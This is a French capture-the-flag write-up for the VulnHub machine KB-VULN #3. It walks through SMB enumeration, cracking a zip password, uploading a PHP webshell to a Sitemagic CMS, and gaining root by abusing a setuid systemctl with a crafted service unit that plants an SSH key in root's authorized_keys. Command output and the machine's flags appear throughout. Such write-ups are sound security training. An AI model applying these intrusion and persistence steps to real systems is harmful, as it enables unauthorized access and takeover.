# Solution du CTF KB-VULN #3 de VulnHub

Kyoto Frift
-----------

Ça manque un peu d'originalité mais comme le précédent on va partir sur du Samba :  

```plain
Nmap scan report for 192.168.56.7
Host is up (0.00017s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cb:04:f0:36:3f:42:f7:3a:ce:2f:f5:4c:e0:ab:fe:17 (RSA)
|   256 61:06:df:25:d5:e1:e3:47:fe:13:94:fd:74:0c:85:00 (ECDSA)
|_  256 50:89:b6:b4:3a:0b:6e:63:12:10:40:e2:c4:f9:35:33 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
MAC Address: 08:00:27:CA:64:3B (Oracle VirtualBox virtual NIC)
Service Info: Host: KB-SERVER; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2021-12-07T21:14:52
|_  start_date: N/A
|_nbstat: NetBIOS name: KB-SERVER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: kb-server
|   NetBIOS computer name: KB-SERVER\x00
|   Domain name: \x00
|   FQDN: kb-server
|_  System time: 2021-12-07T21:14:52+00:00
```

Hack-Me ? Oui oui !  

```bash
$ smbclient -U "" -N -L //192.168.56.7

        Sharename       Type      Comment
        ---------       ----      -------
        Files           Disk      HACK ME
        IPC$            IPC       IPC Service (Samba 4.7.6-Ubuntu)
SMB1 disabled -- no workgroup available

$  smbclient -U "" -N //192.168.56.7/Files
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Oct  2 20:11:49 2020
  ..                                  D        0  Fri Oct  2 19:12:00 2020
  website.zip                         N 38936127  Fri Oct  2 20:11:41 2020

                14380040 blocks of size 1024. 9540188 blocks available
```

Quand on tente de décompresser le zip ce dernier réclame un mot de passe. On a recours à l'utilitaire *zip2john* qui génère un hash aussi long qu'une *Chevrolet Bel Air*. Je vous fait grâce de cet output.  

Ça se casse bien :  

```plain
$ ./john --wordlist=rockyou.txt  hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
porchman         (website.zip)     
1g 0:00:00:02 DONE (2021-12-07 22:19) 0.3861g/s 1764Kp/s 1764Kc/s 1764KC/s porno:O..popchie91
```

L'archive semble être une backup de l'install du CMS [Sitemagic](https://sitemagic.org/). On trouve ainsi des identifiants dans le fichier *config.xml.php* :  

```php
<?php exit(); ?>                                                                                                       
<?xml version="1.0" encoding="ISO-8859-1"?>                                                                            
<entries>                                                                                                              
<!-- REQUIRED, throws custom exception if missing -->                                                                  
    <entry key="Username" value="admin"/>                                                                              
<!-- REQUIRED, throws custom exception if missing -->                                                                  
    <entry key="Password" value="jesse"/>
```

On a aussi un numéro de version dans *metadata.xml* :  

```html
<entry key="Release" value="4.4.2" />
```

Il existe un exploit d'upload pour cette version [sur exploit-db](https://www.exploit-db.com/exploits/48788). L'exploit nécessite une authentification préalable et ça tombe bien on a des identifiants.  

L'intuition m'amène sur *http://192.168.56.7/sitemagic/* et les identifiants passent.  

Pas besoin d'exploit pour cette vulnérabilité : on trouve facilement dans l'interface la fonctionnalité d'upload et elle ne dispose d'aucune restriction sur le type de fichier.  

Par défaut les fichiers sont placés dans le dossier *images* donc mon webshell se retrouve à *http://192.168.56.7/sitemagic/files/images/shell.php*.  

Dokyo Trift
-----------

Un utilisateur heisenberg est présent sur le système. Il possède notamment le premier flag (*6346c6d19751f1a3195f1e4b4b609544*) :  

```plain
drwxr-xr-x 4 heisenberg heisenberg 4096 Oct  2  2020 .
drwxr-xr-x 3 root       root       4096 Oct  2  2020 ..
-rw-r--r-- 1 heisenberg heisenberg  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 heisenberg heisenberg 3771 Apr  4  2018 .bashrc
drwx------ 2 heisenberg heisenberg 4096 Oct  2  2020 .cache
drwx------ 3 heisenberg heisenberg 4096 Oct  2  2020 .gnupg
-rw-r--r-- 1 heisenberg heisenberg  807 Apr  4  2018 .profile
-rw-r--r-- 1 heisenberg heisenberg    0 Oct  2  2020 .sudo_as_admin_successful
-rw-r--r-- 1 root       root         33 Oct  2  2020 user.txt
```

Cette fois pas d'environnement Docker. *LinPEAS* remonte la faille sudo que j'ai mentionné sur d'autres CTFs :  

```plain
[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
```

Mais le CTF est un peu ancien donc l'escalade de privilèges attendue n'est certainement pas liée à cet exploit.  

En revanche le programme */bin/systemctl* est setuid et setgid root. Il existe une entrée pour ce programme [sur GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/) mais elle se base sur un fichier placé dans */tmp* alors que systemctl montre une certaine aversion avec ce dossier (voir par exemple [ici](https://ivanitlearning.wordpress.com/2020/10/14/hackthebox-jarvis/)).  

Je me suis mis sous la racine web où j'avais un accès en écriture et commencé par un petit test :  

```bash
www-data@kb-server:/var/www/html/sitemagic$ cat yolo.service 
[Unit]
Description=root

[Service]
Type=oneshot
ExecStart=/usr/bin/touch  /var/www/html/sitemagic/hi_there.txt

[Install]
WantedBy=multi-user.target

www-data@kb-server:/var/www/html/sitemagic$ systemctl link /var/www/html/sitemagic/yolo.service 
Created symlink /etc/systemd/system/yolo.service → /var/www/html/sitemagic/yolo.service.

www-data@kb-server:/var/www/html/sitemagic$ systemctl enable --now yolo.service
Created symlink /etc/systemd/system/multi-user.target.wants/yolo.service → /var/www/html/sitemagic/yolo.service.

www-data@kb-server:/var/www/html/sitemagic$ systemctl start yolo.service

www-data@kb-server:/var/www/html/sitemagic$ systemctl status yolo.service
● yolo.service - root
   Loaded: loaded (/var/www/html/sitemagic/yolo.service; enabled; vendor preset: enabled)
   Active: inactive (dead) since Wed 2021-12-08 08:14:54 UTC; 1min 23s ago
  Process: 8900 ExecStart=/usr/bin/touch /var/www/html/sitemagic/hi_there.txt (code=exited, status=0/SUCCESS)
 Main PID: 8900 (code=exited, status=0/SUCCESS)

Dec 08 08:14:54 kb-server systemd[1]: Starting root...
Dec 08 08:14:54 kb-server systemd[1]: Started root.

www-data@kb-server:/var/www/html/sitemagic$ ls -l hi_there.txt 
-rw-r--r-- 1 root root 0 Dec  8 09:14 hi_there.txt
```

J'obtiens bien mon fichier créé par *root* :)  

Je modifie le service pour que la commande copie ma clé publique SSH sur */root/.ssh/authorized\_keys* et je relance. Systemctl voit une modification et demande un rechargement :  

```bash
www-data@kb-server:/var/www/html/sitemagic$ systemctl start yolo.service
Warning: The unit file, source configuration file or drop-ins of yolo.service changed on disk. Run 'systemctl daemon-reload' to reload units.

www-data@kb-server:/var/www/html/sitemagic$ systemctl daemon-reload
www-data@kb-server:/var/www/html/sitemagic$ systemctl start yolo.service
www-data@kb-server:/var/www/html/sitemagic$ systemctl status yolo.service
● yolo.service - root
   Loaded: loaded (/var/www/html/sitemagic/yolo.service; enabled; vendor preset: enabled)
   Active: inactive (dead) since Wed 2021-12-08 08:22:05 UTC; 4s ago
  Process: 16351 ExecStart=/bin/cp /var/www/html/sitemagic/my_key.pub /root/.ssh/authorized_keys (code=exited, status=0/SUCCESS)
 Main PID: 16351 (code=exited, status=0/SUCCESS)

Dec 08 08:22:05 kb-server systemd[1]: Starting root...
Dec 08 08:22:05 kb-server systemd[1]: Started root.

root@kb-server:~# cat root.txt 

  ####   ####  #    #  ####  #####    ##   ##### #    # #        ##   ##### #  ####  #    #  ####     
 #    # #    # ##   # #    # #    #  #  #    #   #    # #       #  #    #   # #    # ##   # #        
 #      #    # # #  # #      #    # #    #   #   #    # #      #    #   #   # #    # # #  #  ####     
 #      #    # #  # # #  ### #####  ######   #   #    # #      ######   #   # #    # #  # #      #    
 #    # #    # #   ## #    # #   #  #    #   #   #    # #      #    #   #   # #    # #   ## #    #    
  ####   ####  #    #  ####  #    # #    #   #    ####  ###### #    #   #   #  ####  #    #  #### 

                                            kernelblog.org    

49360ba4cbe27a1b900df25b247315d7
```


*Published December 08 2021 at 12:10*